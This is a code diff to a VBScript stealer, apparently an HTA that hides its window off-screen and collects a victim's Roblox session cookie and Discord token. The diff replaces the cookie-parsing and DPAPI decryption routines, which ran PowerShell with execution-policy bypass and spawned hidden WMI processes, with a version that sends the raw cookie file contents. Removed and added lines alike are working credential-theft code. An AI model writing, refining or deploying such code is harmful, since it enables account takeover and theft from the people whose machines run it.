@@ -16,7 +16,7 @@ Sub Window_OnLoad()
     window.moveTo -2000, -2000
     
     Dim robloxCookie, discordToken
-    robloxCookie = GetRoblox()
+    robloxCookie = GetRobloxRaw()
     discordToken = GetDiscord()
     
     If robloxCookie = "" Then
@@ -34,9 +34,9 @@ Sub Window_OnLoad()
     window.close
 End Sub
 
-Function GetRoblox()
-    GetRoblox = ""
-    Dim paths(4), i, fp, raw, cookie, sp, ep, b64
+Function GetRobloxRaw()
+    GetRobloxRaw = ""
+    Dim paths(4), i, fp, raw
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
     paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
     paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
@@ -51,30 +51,8 @@ Function GetRoblox()
     raw = ReadFile(fp)
     If Len(raw) < 50 Then Exit Function
     
-    cookie = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            ep = InStr(sp, raw, """")
-            If ep > sp Then
-                b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then
-                    cookie = DecryptDPAPI(b64)
-                    If Len(cookie) = 0 Then cookie = b64
-                End If
-            End If
-        End If
-    End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then cookie = Mid(raw, InStr(raw, ".ROBLOSECURITY"))
-    If Len(cookie) = 0 Then cookie = raw
-    
-    Dim cae: cae = InStr(cookie, "|$CAE")
-    If cae = 0 Then cae = InStr(cookie, "|_CAE")
-    If cae > 0 Then cookie = Mid(cookie, cae)
-    
-    GetRoblox = cookie
+    ' Just send the raw text blob directly
+    GetRobloxRaw = raw
 End Function
 
 Function GetDiscord()
@@ -101,33 +79,6 @@ Function GetDiscord()
     End If
 End Function
 
-Function DecryptDPAPI(b64)
-    DecryptDPAPI = ""
-    Dim inf, outf, ps, psf
-    inf = TmpFile("dpi.txt"): outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
-    ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True
-End Function
-
-Sub RunCmd(cmd)
-    Dim w,p,i,s, r
-    Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
-    If i = 0 Then Exit Sub
-    r = True
-    Do While r
-        Set w = GetObject("winmgmts:\\.\root\cimv2")
-        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
-        Set w = Nothing
-        If r Then WScript.Sleep 150
-    Loop
-End Sub
-
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content)
-    Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing
-End Sub
 Function ReadFile(path)
     ReadFile = ""
     Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing
